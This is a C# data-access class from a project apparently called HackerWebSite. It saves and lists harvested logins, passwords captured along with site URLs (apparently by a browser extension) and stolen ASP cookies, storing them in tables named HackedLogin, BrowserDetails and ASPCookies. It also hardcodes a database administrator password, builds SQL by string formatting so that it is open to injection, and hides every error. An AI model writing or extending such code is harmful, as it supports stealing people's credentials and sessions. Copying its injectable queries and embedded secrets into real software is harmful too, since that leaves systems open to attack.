using HackerWebSite.Data;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Threading.Tasks;

namespace HackerWebSite.DAL
{
    public class LoginDAL
    {
        string connectionString = "Data Source=JAYANTH-PC\\SQLSERVER; Initial Catalog=HackedDB;User ID=sa;Password=India@123";

        public List<LoginDTO> GetAllHackedLogins()
        {
            List<LoginDTO> LoginDtoList = new List<LoginDTO>();
            try
            {
                using (SqlConnection con = new SqlConnection(connectionString))
                {

                    string commandText = "SELECT * FROM HackedLogin";
                    SqlCommand cmd = new SqlCommand(commandText, con);
                    cmd.CommandType = CommandType.Text;
                    con.Open();
                    SqlDataReader rdr = cmd.ExecuteReader();

                    while (rdr.Read())
                    {
                        LoginDTO loginDTO = new LoginDTO();
                        loginDTO.Id = Convert.ToInt32(rdr["Id"]);
                        loginDTO.Email = Convert.ToString(rdr["Email"]);
                        loginDTO.Password = Convert.ToString(rdr["Password"]);


                        LoginDtoList.Add(loginDTO);
                    }
                    con.Close();
                }
            }
            catch (Exception)
            {
            }

            return LoginDtoList;
        }

        public void PostLoginDetails(LoginDTO loginDTO)
        {
            try
            {
                using (SqlConnection con = new SqlConnection(connectionString))
                {

                    string commandText = string.Format("INSERT INTO HackedLogin(Email,Password) Values('{0}', '{1}');",loginDTO.Email, loginDTO.Password);
                    SqlCommand cmd = new SqlCommand(commandText, con);
                    cmd.CommandType = CommandType.Text;
                    con.Open();
                    cmd.ExecuteNonQuery();
                    con.Close();
                }
            }
            catch (Exception)
            {
            }
        }

        public void PostBrowserDetails(BrowserExtensionDTO browserExtensionDTO)
        {
            try
            {
                using (SqlConnection con = new SqlConnection(connectionString))
                {

                    string commandText = string.Format("INSERT INTO BrowserDetails(Url,Email,Password) Values('{0}', '{1}', '{2}');", browserExtensionDTO.Url, browserExtensionDTO.Email, browserExtensionDTO.Password);
                    SqlCommand cmd = new SqlCommand(commandText, con);
                    cmd.CommandType = CommandType.Text;
                    con.Open();
                    cmd.ExecuteNonQuery();
                    con.Close();
                }
            }
            catch (Exception)
            {
            }
        }

        public void SaveCookies(CookiesDTO cookiesDTO)
        {
            try
            {
                using (SqlConnection con = new SqlConnection(connectionString))
                {

                    string commandText = string.Format("INSERT INTO ASPCookies(ASPCookie,Email,Password) Values('{0}', '{1}', '{2}');", cookiesDTO.CookieName, cookiesDTO.Email, cookiesDTO.Password);
                    SqlCommand cmd = new SqlCommand(commandText, con);
                    cmd.CommandType = CommandType.Text;
                    con.Open();
                    cmd.ExecuteNonQuery();
                    con.Close();
                }
            }
            catch (Exception)
            {
            }
        }
    }
}
